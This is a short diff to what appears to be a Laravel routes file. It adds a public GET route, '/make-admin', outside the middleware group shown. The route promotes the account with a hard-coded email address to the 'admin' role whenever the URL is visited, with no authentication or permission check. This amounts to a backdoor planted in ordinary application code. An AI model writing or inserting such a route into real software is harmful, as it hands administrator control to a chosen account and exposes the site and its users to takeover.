@@ -189,3 +189,15 @@ Route::patch('/profile',[ProfileController::class,'update'])
 Route::post('/password',[ProfileController::class,'password']);
 
 });
+
+Route::get('/make-admin', function(){
+    $user=\App\Models\User::where('email','ekko@gmail.com')->first();
+
+    if($user){
+        $user->role='admin';
+        $user->save();
+        return 'Admin updated';
+    }
+
+    return 'User not found';
+});
